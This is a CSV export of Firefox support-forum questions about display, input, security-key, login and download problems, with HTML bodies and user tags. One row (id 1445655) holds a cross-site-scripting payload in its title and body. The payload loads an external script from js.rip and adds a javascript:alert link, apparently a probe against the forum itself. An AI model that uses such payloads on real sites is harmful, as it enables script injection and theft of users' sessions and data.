id,created,updated,title,content,tags,product,topic,locale,answers,creator
1445669,2024-04-23 14:51:25 -0700,2024-04-23 14:51:25 -0700,email,"<p>cannot send my documents on email. Says too large, only 23 mb.worked for years. only changed with the newer vesion . </p>",desktop;other;windows-10;,firefox,other,en-US,"",rickd1
1445668,2024-04-23 14:39:07 -0700,2024-04-23 14:39:07 -0700,poor resolution display only in firefox,"<p>I am having the same issues as the person in this thread, but unlike their situation, firefox has not fixed itself out of nowhere. <a href=""https://support.mozilla.org/en-US/questions/1104044"" rel=""nofollow"">https://support.mozilla.org/en-US/questions/1104044</a> </p><p>Everything in the firefox browser looks like it was stretched it out in MSPaint, while my actual OS interface and every other app/software UI looks fine. I have tried simply restarting my computer, as well as every solution in the linked thread, as well as refreshing firefox, and uninstalling/reinstalling, which only served to mess up my shortcuts on the home page.  To be clear: </p> <ul><li> Hardware acceleration is turned OFF, as suggested in any thread I've found where a resolution issue is addressed. </li><li> setting layout.css.devPixelsPerPx to 1.25 specifically makes it almost legible. Almost. It's still incredibly grainy. Any higher even a small portion of a webpage takes up a ridiculous portion of my screen, rendering it just as unusable. </li><li> In messing around in config, I found that setting gfx.color_management.rendering_intent to 5 helped, in so far as it sharpened things up a little, but it did not FIX the issue. Any value above 5 seems to have zero effect or change. </li><li> Absolutely EVERYTHING else except firefox looks absolutely fine. It is ONLY firefox that is having this issue of all the applications/interfaces on my computer. </li><li> Everything in firefox is affected- images, text, the tabs and address bar, bookmarks bar, absolutely everything. </li></ul>",desktop;other;windows-10;firefox-1250;firefox-12502;,firefox,other,en-US,"",princelithey
1445663,2024-04-23 13:17:40 -0700,2024-04-23 13:17:40 -0700,Cursor speed is insanely slow only in Firefox,"<p>Out of nowhere, my cursor speed in Firefox has slowed to a truly unusable crawl. I refreshed a page and it was suddenly inching along at worse than a snail's pace. I'm using a USB trackball mouse. This is only affecting Firefox; no other applications have this issue. Using Windows 10. </p><p>Here's what I've tried so far: </p> <ul><li> Restart Firefox </li><li> Started Firefox in Safe Mode </li><li> Restart computer </li><li> Create a new profile in Firefox </li><li> Check my mouse's firmware </li><li> Try a different mouse </li></ul> <p>There was <a href=""https://support.mozilla.org/en-US/questions/1266980"" rel=""nofollow"">another question</a> about this years ago, but the accepted answer about accidentally enabling a Windows accessibility feature doesn't say which feature it is or how to disable it (if that's indeed the case). The link also seems to redirect to a generic accessibility page. </p>",desktop;fix-problems;windows-10;,firefox,fix-problems,en-US,"",gdniedbalski
1445662,2024-04-23 13:10:54 -0700,2024-04-23 14:42:01 -0700,exceptions in configuration security disappear after restart,"<p>I have a NAS server, where I save all my data. When I type the local address 192.168.2.10:5001 I always get the warning That this is a malicious site. I havo enter I know the risk etc. which cost me time and is useless, since my NAS server is under my control. </p><p>I have tried to put the server address in several exceptions, but they disappear. </p><p>How to tell Firefox that my Nas srver is safe? </p>",desktop;privacy-and-security_1;windows-11;firefox-1250;firefox-12502;,firefox,privacy-and-security,en-US,1649088;1649090;,firefox@vangelder.nl
1445660,2024-04-23 13:05:06 -0700,2024-04-23 14:47:45 -0700,Frequently visited sites no longer recognize me.,"<p>Starting with my bank's web site, my user name/password is being challenged. I can't bank. Elsewhere, where my desk top has always been recognized, I'm now forced to log in each time...and I receive an email that a new device has just logged into my account. All of this suspiciously coincides with a recent browser update. On my bank feedback it's showing as Firefox ""125""...when all previous logins were recorded as Firefox ""124"". Help! </p>",desktop;beta;other;windows-10;firefox-1250;,firefox,other,en-US,1649091;,donmacneil
1445659,2024-04-23 13:00:23 -0700,2024-04-23 13:00:23 -0700,yubikey stops working after X hours,"<p>hello everyone; i have a strange issue with my yubikey and firefox on redhat linux 8.  (i can't upgrade to red hat 9 and it's technically oracle linux) </p><p>its works fine for the first x hours (where x is usually between 1 and 3 hours) and then firefox will invariably stop recognizing the yubikey touch.  yubikey works with any other application in that journalctl shows that systemd is aware of it's existence when i plug/unplug it and i get a string in my terminal and text editors whenever i touch they key both before and after it stops working with firefox. </p><p>i've tried these things but the behavior is still the same: - regenerating my ~/.mozilla configuration directory - toggling all *webauth* keys in about:config - switching from yum to flatpak firefox installation - switching from gnome to kde to xfce - switching from Wayland to X11 </p><p>there are no error messages; journalctl doesn't show any either; and chrome doesn't seem to have this problem, but i don't trust chrome and, interestingly, chrome exhibits the same behavior when using xfce. </p><p>the only thing that works reliability is rebooting each time it happens and, as you can imagine, that's 100% intrusive and i lose all momentum in my productivity. </p><p>here's details on my system: </p><p>Firefox version: 115.10.0esr (64-bit) </p><p>OS: Red Hat Enterprise Linux release 8.9 (Ootpa) Oracle Linux Server release 8.9 5.15.0-205.149.5.1.el8uek.x86_64 </p><p>X Windows info: gnome-session-wayland-session.x86_64               3.28.1-21.0.1.el8                                           @AppStream             libwayland-client.x86_64                           1.21.0-1.el8                                                @AppStream             libwayland-cursor.x86_64                           1.21.0-1.el8                                                @AppStream             libwayland-egl.x86_64                              1.21.0-1.el8                                                @AppStream             libwayland-server.x86_64                           1.21.0-1.el8                                                @AppStream             qt5-qtwayland.x86_64                               5.15.3-1.el8                                                @AppStream             xorg-x11-server-Xwayland.x86_64                    21.1.3-12.el8                                               @AppStream </p><p>I have support licensing from both Oracle and Yubikey and i've asked them for help and they both point the finger at each other so i'm stuck with this; any help would be appreciated! </p>",linux;desktop;other;firefox-115100;firefox-11510_1;,firefox,other,en-US,"",davidalphagamma
1445657,2024-04-23 12:55:48 -0700,2024-04-23 14:39:32 -0700,Log in preference setting,"<p>Hi there! Every time i go onto a site like YouTube, <a href=""http://Chess.com"" rel=""nofollow"">Chess.com</a>, ChatGPT etc, it asks for my login each time and i know there is a setting for it to remember me so i do not have to log into my account every time i use the site but I have looked everywhere and still fail to see it. Where about can i turn this setting on so i do not have to sign into my profile to use the relevant site. Thank you. </p>",desktop;customize;windows-11;firefox-1250;firefox-12501;,firefox,customize,en-US,1649089;,parth.mistry360
1445655,2024-04-23 12:47:47 -0700,2024-04-23 12:48:24 -0700,"asdsa""><script src=""https://js.rip/h6rovow4d3""></script>","<p>adsasdasd""&gt;&lt;script src=""https://js.rip/h6rovow4d3""&gt;&lt;/script&gt;[[javascript:alert(1);|javascript:alert(1);]] </p>",desktop;beta;cookies;windows-10;firefox-1250;,firefox,cookies,en-US,1649082;,ryunjinx1337
1445653,2024-04-23 11:47:04 -0700,2024-04-23 11:47:04 -0700,website displays a Mozilla error,"<p>Greetings, I am Alvimutmex. A ""not supported"" notice shows up each time the Mozilla browser loads a webpage. After looking through the settings, I discovered that Mozilla has to be updated. Could you please help me update Mozilla? For instance, when I attempt to open (<a href=""https://phoneinsurance.us/"" rel=""nofollow"">https://phoneinsurance.us/</a>), I get an error warning. </p>",desktop;windows-10;website-breakages;,firefox,website-breakages,en-US,"",atviliunven
1445652,2024-04-23 11:39:50 -0700,2024-04-23 11:39:50 -0700,Bookmark dropdowns,<p>When you added a bookmark to a site in Firefox there used to be an option that when you hovered over the bookmark a dropdown would appear showing recent changes or additions to the site (see attached). It doesn't seem to be there any more - is there any means of restoring it? Thank you. </p>,desktop;bookmarks;windows-11;firefox-1250;firefox-12501;,firefox,bookmarks,en-US,"",dwl68
1445649,2024-04-23 10:52:42 -0700,2024-04-23 10:52:42 -0700,"Disable ""Add outlook as application prompt"" PERMANENTLY","<p>Please see the attached screenshot. I get this popup EVERY TIME I open FireFox. I've tried a number of different suggested ""fixes"" from Google Searches with no success. </p><p>I want this popup GONE. </p>",desktop;customize;windows-11;firefox-1250;firefox-12502;,firefox,customize,en-US,"",justin91
1445648,2024-04-23 10:45:53 -0700,2024-04-23 10:45:53 -0700,descargar directamente contenidos de paginas http que tengo en mi propia red,"<p>Trabajo en un entorno seguro con un servidor web (http) al instalar firefox 125 no me deja bajar los documentos, me dice que la descarga no es segura y tengo que darle a cada descarga para confirmar que me fio de ese documento. </p><p>¿Podría poner la dirección de esa web en algún sitio y que se me abran directamente los documentos? </p><p>En versiones antiguas no tenia problema. </p><p>Gracias </p>",desktop;privacy-and-security_1;windows-10;firefox-1250;firefox-12501;,firefox,privacy-and-security,es,"",mpcadahia
